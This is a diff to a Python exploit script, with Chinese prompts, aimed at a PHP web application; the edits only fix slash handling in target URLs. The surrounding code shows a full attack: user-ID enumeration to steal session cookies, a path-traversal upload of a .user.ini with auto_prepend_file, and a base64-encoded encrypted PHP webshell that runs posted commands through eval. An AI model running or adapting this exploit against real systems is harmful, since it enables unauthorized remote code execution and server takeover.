@@ -30,7 +30,7 @@ def title():
 
 def Target_Info(target_url):
     print(BLUE + '\n[*]正在获取版本信息\n' + ENDC)
-    url = target_url + '/inc/expired.php'
+    url = target_url + 'inc/expired.php'
     try:
         response = requests.get(url=url, headers=headers, timeout=5)
         pattern = re.compile('<td class="Big"><span class="big3">(.*?)</span>', re.S)
@@ -41,8 +41,8 @@ def Target_Info(target_url):
 
 
 def Target_URL(target_url, uid):
-    url = target_url + '/mobile/auth_mobi.php?isAvatar=1&uid=%d&P_VER=0' % (uid)
-    manage = target_url + "/general/"
+    url = target_url + 'mobile/auth_mobi.php?isAvatar=1&uid=%d&P_VER=0' % (uid)
+    manage = target_url + "general/"
     print(BLUE + '[*]正在遍历UID=%d' % (uid) + ENDC)
     try:
         response = requests.get(url=url, headers=headers, timeout=5)
@@ -68,7 +68,7 @@ def Upload_Ini(target_url, cookie):
         'Cookie': cookie,
         'Content-Type': 'multipart/form-data; boundary=---------------------------17518323986548992951984057104',
     }
-    payload = '/general/hr/manage/staff_info/update.php?USER_ID=../../general\\reportshop\workshop\\report\\attachment-remark/.user'
+    payload = 'general/hr/manage/staff_info/update.php?USER_ID=../../general\\reportshop\workshop\\report\\attachment-remark/.user'
     data = base64.b64decode(
         'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmluaSIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgphdXRvX3ByZXBlbmRfZmlsZT0xMTExMTEubG9nCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJzdWJtaXQiCgrmj5DkuqQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNC0t')
     try:
@@ -90,7 +90,7 @@ def Upload_Log(target_url, cookie):
         'Cookie': cookie,
         'Content-Type': 'multipart/form-data; boundary=---------------------------17518323986548992951984057104',
     }
-    payload = '/general/hr/manage/staff_info/update.php?USER_ID=../../general\\reportshop\workshop\\report\\attachment-remark/111111'
+    payload = 'general/hr/manage/staff_info/update.php?USER_ID=../../general\\reportshop\workshop\\report\\attachment-remark/111111'
     data = base64.b64decode(
         'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmxvZyIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocAplY2hvICdpdCB3b3JrJzsKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7CgkkX1NFU1NJT05bJ2snXT0ka2V5OwoJc2Vzc2lvbl93cml0ZV9jbG9zZSgpOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOwogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7Cj8+Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJzdWJtaXQiCgrmj5DkuqQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNC0t')
     try:
@@ -110,7 +110,7 @@ def Get_Shell(target_url, cookie):
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
         'Cookie': cookie
     }
-    payload = '/general/reportshop/workshop/report/attachment-remark/form.inc.php'
+    payload = 'general/reportshop/workshop/report/attachment-remark/form.inc.php'
     try:
         res = requests.get(url=target_url + payload, headers=headers, timeout=5)
         if res.status_code == 200 and 'it work' in res.text:
@@ -127,6 +127,9 @@ def Get_Shell(target_url, cookie):
 if __name__ == '__main__':
     title()
     target_url = str(input(BOLD + 'Url: ' + ENDC))
+    if target_url[-1] != '/':
+        target_url += '/'
+    print(BLUE + '\nTarget: ' + target_url + ENDC)
     Target_Info(target_url)
     res = input(BOLD + '默认sleep=0, 是否遍历UID? (y/n): ' + ENDC)
     if res == 'y':
